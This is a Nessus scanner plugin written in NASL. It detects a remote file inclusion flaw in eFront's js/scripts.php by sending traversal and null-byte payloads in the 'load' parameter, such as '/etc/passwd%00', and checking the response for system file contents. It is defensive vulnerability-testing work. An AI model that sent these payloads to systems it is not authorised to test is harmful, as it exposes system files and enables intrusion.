#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(54613);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2015/05/26 15:34:39 $");

  script_bugtraq_id(47870);

  script_name(english:"eFront js/scripts.php 'load' Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a file");

  script_set_attribute(attribute:"synopsis", value:
"A PHP application running on the remote web server is affected by a
remote file inclusion vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of eFront running on the remote web server is affected by
a remote file inclusion vulnerability due to improper sanitization of
user-supplied input to the 'load' parameter of the js/scripts.php
script before using it in a PHP include() function call. An attacker
can exploit this issue to view files on the local host or to execute
arbitrary PHP code, possibly taken from third-party hosts.");
  # http://packetstormsecurity.org/files/view/101456/eFront3.6.9build10653-lfi.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dd700bf8");
  script_set_attribute(attribute:"see_also", value:"http://forum.efrontlearning.net/viewtopic.php?f=15&t=3135");
  script_set_attribute(attribute:"solution", value:
"Upgrade to eFront v3.6.9 build 10905 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"eFront 3.6.9 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/05/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/05/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/05/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:efrontlearning:efront");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("efront_detect.nbin", "os_fingerprint.nasl");
  script_require_keys("www/PHP", "installed_sw/eFront");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "eFront";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini', 'editor/tiny_mce/tiny_mce_gzip.js');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['editor/tiny_mce/tiny_mce_gzip.js'] = "var tinyMCE_GZ";

vuln = FALSE;

foreach file (files)
{
  if (file[0] == '/') exploit = file + '%00';
  else exploit = "..%2f" + (file - '.js');

  url = '/js/scripts.php?load=' + exploit;
  res = http_send_recv3(method:"GET", item:dir+url, port:port, exit_on_fail:TRUE);

  # There's a problem if we see the expected contents.
  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    vuln = TRUE;
    output = res[2];
    break;
  }
}
if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  file        : file,
  request     : make_list(install_url + url),
  output      : chomp(output),
  attach_type : 'text/plain'
);
exit(0);
